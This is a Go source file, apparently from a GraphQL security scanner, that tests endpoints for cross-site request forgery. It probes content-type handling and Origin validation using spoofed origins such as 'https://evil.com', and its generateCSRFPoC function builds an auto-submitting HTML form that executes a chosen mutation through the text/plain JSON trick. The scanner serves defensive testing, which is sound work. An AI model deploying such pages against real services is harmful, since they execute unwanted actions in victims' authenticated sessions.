package scanner

import (
	"fmt"
	"net/http"
	"strings"
	"time"
)

// CSRF testing categories.
const (
	CategoryCSRF Category = "CSRF"
)

func init() {
	CategoryMeta[CategoryCSRF] = struct {
		Name     string
		Severity Severity
	}{"Cross-Site Request Forgery", SeverityHigh}
}

// CSRFTestResult holds the result of a single CSRF check.
type CSRFTestResult struct {
	Test    string
	Vuln    bool
	Details string
}

// RunCSRFTests performs CSRF-specific tests against a GraphQL endpoint.
// It checks:
// 1. Content-Type enforcement — does the API accept form-urlencoded?
// 2. Origin header validation — does the API reject cross-origin requests?
// 3. Generates a PoC HTML form for any vulnerable mutation.
func RunCSRFTests(targetURL string, headers map[string]string, mutations []OperationTarget) []Finding {
	var findings []Finding
	findingID := 0

	// Test 1: Content-Type enforcement
	// If the server accepts application/x-www-form-urlencoded, CSRF via HTML forms is possible.
	formBody := `query=%7B__typename%7D`
	req, err := http.NewRequest(http.MethodPost, targetURL, strings.NewReader(formBody))
	if err == nil {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		for k, v := range headers {
			if !strings.EqualFold(k, "content-type") {
				req.Header.Set(k, v)
			}
		}

		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err == nil {
			resp.Body.Close()
			// If the server returns 200, it accepts form-encoded content → CSRF possible
			if resp.StatusCode == 200 {
				findingID++
				findings = append(findings, Finding{
					ID:       fmt.Sprintf("CSRF-%d", findingID),
					Category: CategoryCSRF,
					Severity: SeverityHigh,
					Operation: "__typename",
					Argument: "Content-Type",
					Payload:  "application/x-www-form-urlencoded",
					Evidence: fmt.Sprintf("Server returned HTTP %d for form-urlencoded request", resp.StatusCode),
					Description: "The GraphQL endpoint accepts application/x-www-form-urlencoded requests. " +
						"This means an attacker can craft an HTML form that submits GraphQL mutations " +
						"cross-origin, executing actions in the victim's authenticated session.",
					StatusCode: resp.StatusCode,
				})
			}
		}
	}

	// Test 2: Origin header validation
	// Send a request with a spoofed Origin header to check if the server validates it.
	spoofedOrigins := []string{
		"https://evil.com",
		"null",
	}

	for _, origin := range spoofedOrigins {
		body := `{"query":"{__typename}"}`
		req, err := http.NewRequest(http.MethodPost, targetURL, strings.NewReader(body))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Origin", origin)
		for k, v := range headers {
			if !strings.EqualFold(k, "origin") {
				req.Header.Set(k, v)
			}
		}

		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 200 {
			acao := resp.Header.Get("Access-Control-Allow-Origin")
			findingID++
			evidence := fmt.Sprintf("Server returned HTTP %d with Origin: %s", resp.StatusCode, origin)
			if acao != "" {
				evidence += fmt.Sprintf(", ACAO: %s", acao)
			}
			findings = append(findings, Finding{
				ID:       fmt.Sprintf("CSRF-%d", findingID),
				Category: CategoryCSRF,
				Severity: SeverityHigh,
				Operation: "__typename",
				Argument: "Origin",
				Payload:  origin,
				Evidence: evidence,
				Description: fmt.Sprintf("The server accepts requests with Origin: %s without rejection. "+
					"This indicates missing or misconfigured Origin validation, "+
					"making CSRF attacks possible.", origin),
				StatusCode: resp.StatusCode,
			})
		}
	}

	// Test 3: Generate PoC HTML for each mutation
	for _, mut := range mutations {
		findingID++
		poc := generateCSRFPoC(targetURL, mut)
		findings = append(findings, Finding{
			ID:       fmt.Sprintf("CSRF-%d", findingID),
			Category: CategoryCSRF,
			Severity: SeverityMedium,
			Operation: mut.Name,
			Argument: "(PoC)",
			Payload:  poc,
			Evidence: "CSRF PoC HTML form generated for mutation",
			Description: fmt.Sprintf("A Proof-of-Concept HTML page was generated that, when opened by an "+
				"authenticated user, will execute the '%s' mutation in their session. "+
				"If CSRF protections are missing, this mutation will execute.", mut.Name),
			StatusCode: 0,
		})
	}

	return findings
}

// generateCSRFPoC creates an HTML page with a form that submits a GraphQL mutation.
// Uses the enctype="text/plain" trick: the form sends name=value as plaintext.
// We put most of the JSON in the name, and absorb the = into a junk field.
func generateCSRFPoC(targetURL string, mut OperationTarget) string {
	// Escape the query for embedding in JSON inside an HTML attribute.
	query := strings.ReplaceAll(mut.Query, `\`, `\\`)
	query = strings.ReplaceAll(query, `"`, `\"`)

	// The form will send: <name>=<value>
	// name = {"query":"<mutation>","_":"
	// value = "}
	// Result: {"query":"<mutation>","_":"="}  — valid JSON, the = is absorbed.
	formName := fmt.Sprintf(`{"query":"%s","_":"`, query)

	return fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><title>CSRF PoC — %s</title></head>
<body>
<h2>CSRF PoC: %s</h2>
<p>This page will automatically submit the mutation when loaded.</p>
<form id="csrf-form" method="POST" action="%s" enctype="text/plain">
  <input type="hidden" name='%s' value='"}' />
  <input type="submit" value="Submit" />
</form>
<script>
  // Auto-submit after 1 second
  setTimeout(function() {
    document.getElementById('csrf-form').submit();
  }, 1000);
</script>
</body>
</html>`, mut.Name, mut.Name, targetURL, formName)
}
